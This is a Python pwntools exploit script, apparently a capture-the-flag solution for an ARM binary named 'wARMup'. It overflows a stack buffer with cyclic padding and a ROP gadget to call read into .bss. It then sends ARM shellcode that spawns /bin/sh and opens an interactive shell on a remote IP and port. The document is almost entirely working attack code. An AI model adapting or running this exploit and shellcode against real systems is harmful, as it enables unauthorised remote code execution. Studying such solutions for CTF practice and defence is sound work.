#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys
context.binary = "./wARMup"
context.log_level = "debug"
elf = context.binary
libc = ELF("./lib/libc.so.6")

if sys.argv[1] == "l":
    io = process(["qemu-arm", "-L", "./", "./wARMup"])
elif sys.argv[1] == "d":
    io = process(["qemu-arm", "-g", "1234", "-L", "./", "./wARMup"])
else:
    io = remote("18.191.89.190", 1337)

sc = "\x01\x30\x8f\xe2"
sc += "\x13\xff\x2f\xe1"
sc += "\x78\x46\x0c\x30"
sc += "\xc0\x46\x01\x90"
sc += "\x49\x1a\x92\x1a"
sc += "\x0b\x27\x01\xdf"
sc += "\x2f\x62\x69\x6e"
sc += "\x2f\x73\x68";

if __name__ == "__main__":
    '''
    0x00010364: pop {r3, pc};

    .text:00010534                 MOV     R1, R3          ; buf
    .text:00010538                 MOV     R0, #0          ; fd
    .text:0001053C                 BL      read
    .text:00010540                 MOV     R3, #0
    .text:00010544                 MOV     R0, R3
    .text:00010548                 SUB     SP, R11, #4
    .text:0001054C                 LDMFD   SP!, {R11,PC}
    .text:0001054C ; End of function main
    '''
    base = elf.bss() + 0x300
    payload = flat(cyclic(100), base, 0x00010364, base, 0x10534)
    pause()
    io.send(payload)

    io.send(flat(base- 0x4, sc))

    io.interactive()
